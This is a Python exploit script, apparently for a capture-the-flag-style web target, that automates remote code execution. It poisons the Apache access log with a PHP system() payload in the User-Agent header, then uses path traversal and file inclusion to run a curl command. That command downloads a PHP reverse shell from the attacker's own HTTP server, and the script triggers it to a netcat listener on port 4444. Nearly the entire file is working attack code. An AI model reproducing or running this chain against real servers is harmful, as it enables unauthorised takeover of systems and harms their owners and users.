from logging import Handler
import requests
import http.server
import socketserver
import argparse
import urllib
from threading import Thread
from time import sleep

#Temporary hard-coded variables
LHOSTS = "192.168.0.1"
RHOSTS = "10.0.0.1"
PORT = 8000
RPORT = 4444 #default
RSHELL = "./php-reverse-shell.php" # default

# Exploit necessary strings
POISON =  "\"<?php system($_GET[\'c\']); ?>\""
PAYLOAD = RHOSTS + "/?view=dog/../../../../../../var/log/apache2/access.log&ext=&c="\
 + urllib.parse.quote(f"curl {LHOSTS}:8000/php-reverse-shell.php --output shell.php")

TRIGGER = f"{RHOSTS}/?view=dog/../shell&IP={LHOSTS}"

def serve_reverse_shell():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("[*] Serving at port", PORT)
        httpd.serve_forever()

def main():
    print("[*] Poisoning Apache log file with command injection...")
    response = requests.get("http://" + RHOSTS,headers={"user-agent" : POISON})
    if response.status_code != 200:
        print("[!] Error, server rejected request. Maybe wrong ip address?")
        exit()
    else:
        print("[+] Done.")
        # ADD Status saving here!
    print("[*] Starting http server to serve reverse shell...")
    t = Thread(target=serve_reverse_shell,daemon=True)
    t.start()
    sleep(4)
    print("[+] Done")
    print("[*] Staging php reverse shell...")
    response = requests.get("http://" + PAYLOAD)
    if response.status_code == 500 or response.text.find("Warning") != -1 or response.text.find("Fatal erro") != -1:
        print("[!] Error, php include failed including acess.log. Maybe Payload string is broken?")
        exit()
    print("[+] Request accepted")
    print("[?] Start your netcat listener to get a reverse shell conection with nc -lvnp 4444")
    input("Press Enter when netcat listener is up...")
    print("[!!] Triggering reverse shell... Did you get a shell?")
    requests.get("http://" + TRIGGER)
    exit()

if __name__ == '__main__':
    main()